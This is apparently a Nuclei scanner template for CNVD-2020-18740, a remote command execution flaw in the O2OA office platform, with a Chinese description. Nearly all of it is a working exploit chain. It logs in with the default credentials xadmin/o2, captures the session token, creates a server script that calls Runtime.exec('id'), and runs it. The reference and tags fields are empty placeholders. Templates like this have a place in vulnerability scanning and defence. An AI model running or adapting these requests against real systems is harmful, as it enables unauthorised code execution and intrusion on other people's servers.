id: CNVD-2020-18740
info:
  name: O2OA invoke 后台远程命令执行漏洞 CNVD-2020-18740
  author: apple
  severity: critical
  description: O2OA是一款开源免费的企业及团队办公平台，提供门户管理、流程管理、信息管理、数据管理四大平台,集工作汇报、项目协作、移动OA、文档分享、流程审批、数据协作等众多功能，满足企业各类管理和协作需求。 O2OA系统invoke 接口存在远程代码执行漏洞。攻击者可利用漏洞执行任意代码。
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /x_organization_assemble_authentication/jaxrs/authentication/captcha?l7u46why&v=7.1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        Content-Length: 39
        Authorization: anonymous
        Content-Type: application/json; charset=UTF-8
        Accept-Encoding: gzip, deflate
        Connection: close

        {"credential":"xadmin","password":"o2"}
      - |-
        POST /x_program_center/jaxrs/invoke?v=6.3 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
        Content-Length: 567
        Authorization: search["token"]
        Content-Type: application/json; charset=UTF-8
        Cookie: {{token}}; path=/; domain={{Hostname}}
        Accept-Encoding: gzip, deflate
        Connection: close

        {"id":"cmd","name":"cmd","enableToken":false,"alias":"","description":"","validated":true,"enable":true,"text":"var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(\"id\").getInputStream()));\n\nvar result = [];\nwhile (true) {\n    var oneline = bufReader.readLine();\n    result.push(oneline);\n    if (!oneline) break;\n}\nvar result = { \"Result\": result };\nthis.response.setBody(result, \"application/json\"); ","remoteAddrRegex":"","createTime":"2022-08-27 04:39:18","updateTime":"2022-08-27 04:39:18"}
      - |+
        POST /x_program_center/jaxrs/invoke/cmd/execute HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
        Content-Length: 0
        Content-Type: application/json; charset=UTF-8
        Cookie: {{token}}; path=/; domain={{Hostname}}
        Accept-Encoding: gzip, deflate
        Connection: close

    matchers:
      - type: word
        part: body
        words:
          - 'uid='
          
    extractors:
      - type: regex
        name: token
        internal: true
        part: header_1
        regex:
          - 'x-token=\s*([A-Za-z0-9]+)'